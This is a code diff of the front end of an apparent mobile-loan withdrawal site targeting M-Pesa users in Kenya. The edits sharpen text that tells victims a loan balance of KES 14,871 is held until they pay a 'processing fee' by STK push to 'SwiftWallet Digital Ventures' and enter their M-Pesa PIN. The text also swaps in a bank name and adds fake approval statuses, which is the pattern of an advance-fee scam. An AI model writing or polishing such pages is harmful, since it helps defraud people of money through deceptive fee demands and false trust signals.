@@ -482,7 +482,7 @@
                 <div class="text-sm mb-2">Amount to Withdraw</div>
                 <div id="withdrawalAmount" class="text-4xl font-bold">KES 14,871</div>
                 <div class="text-sm mt-2 text-orange-600">
-                    Processing fee will be deducted automatically
+                    This is that amount you'll get to your mpesa by completing the fee needed to trigger instant withdrawal.
                 </div>
             </div>
 
@@ -582,7 +582,7 @@
                         <div class="flex justify-between items-start">
                             <div>
                                 <h4 class="font-semibold text-gray-900">Funds Disbursement</h4>
-                                <p class="text-sm text-gray-600">Waiting for withdrawal confirmation</p>
+                                <p class="text-sm text-gray-600">Waiting for your withdrawal confirmation by competing fee payment to release your available balance funds</p>
                             </div>
                             <span class="text-xs text-gray-500">Pending</span>
                         </div>
@@ -754,8 +754,8 @@
             </div>
             
             <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
-            <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital Adventures STK Push...</p>
-            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from SWIFTWALLET DIGITAL ADVENTURES</p>
+            <p class="text-xl mb-4" id="processingMessage">Initiating SwiftWallet Digital ventures STK Push...</p>
+            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from SWIFTWALLET DIGITAL VENTURES</p>
             
             <!-- Trust indicators -->
             <div class="flex justify-center items-center space-x-6 mb-6">
@@ -797,7 +797,7 @@
     </div>
 
     <p class="text-sm text-gray-600 mb-4">
-      Paste your M-Pesa transaction code below to verify withdrawal .check your phone with message from CHOICE MICROFINANCE BANK.
+      Paste your M-Pesa transaction code below to verify withdrawal .check your phone with message from CHASE BANK.
     </p>
 
     <input 
@@ -1447,7 +1447,7 @@
                 'bank': 'fas fa-university'
             };
 
-            const message = `Your withdrawal is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL ADVENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment confirmation.`;
+            const message = `Your withdrawal is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING APPROVAL</span> after fee payment confirmation.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
@@ -1547,7 +1547,7 @@
             if (feePaymentInitiated === 'true') {
                 const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
                 showSuccess(
-                    `Complete previous request sent to (${loanData.phone}) by clicking withdraw button  below .STK Push was sent from SWIFTWALLET DIGITAL ADVENTURES for the requested processing fee. Please complete the fee payment to process your ${withdrawalMethod} withdrawal. Status: <span class="text-orange-600 font-bold">PENDING APPROVAL</span>`
+                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from SWIFTWALLET DIGITAL VENTURES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING ADMIN APPROVAL</span>`
                 );
                 updateDisbursementTimeline(true);
             }
